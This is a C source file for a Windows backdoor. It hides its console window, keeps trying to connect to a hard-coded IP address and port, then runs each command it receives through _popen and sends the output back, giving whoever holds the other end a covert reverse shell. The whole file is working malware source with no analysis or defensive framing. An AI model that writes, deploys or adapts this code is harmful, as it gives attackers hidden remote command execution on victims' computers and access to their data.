
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>		//Provides access to POSIX
#include <winsock2.h>   //for communication
#include <windows.h> 	//it is the main header file for WinAPI.WinAPI is anything and everything related to programming on Windows
#include <winuser.h>   	//Windows-specific which contains declarations for all of the functions in the Windows API, all the common macros and all the data types used by the various functions and subsystems
#include <wininet.h>   	//create rename delete file and bunch of stuffs with urls annd http server
#include <windowsx.h>   //contains declarations for all of the functions in the Windows API
#include <string.h>			   
#include <sys/stat.h>	//header defines the structure of the data returned by the functions fstat(), lstat(), and stat()
#include <sys/types.h>	//contains a number of basic derived types that should be used whenever appropriate

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

void Shell() {
	char buffer[1024];
	char container[1024];
	char total_response[18384];


	while (1) {
		jump:
		bzero(buffer,1024);	//zero all three variables 
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, 1024, 0);	//Receive command from server 

		if (strncmp("q", buffer, 1) == 0) {	//for disconnecting 
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else {
			FILE *fp;
			fp = _popen(buffer, "r");	//opening	 file as a process   
			while(fgets(container,1024,fp) != NULL) {
				strcat(total_response, container);
			}
			send(sock, total_response, sizeof(total_response), 0);
			fclose(fp);
		}
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
	//Hide Console 
	HWND stealth;	
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0); //0 coz hiding this one and showing another window

	//Defining Connection port to backdoor
	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;	//structure that contains info about windows sockets

	ServIP = "192.168.43.247";	
	ServPort = 49669;	//use netstat -a to find free port

	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
		exit(1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);

	//connection attempt in every 5 sec
	again:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(5);
		goto again;
	}
	
	Shell();
}
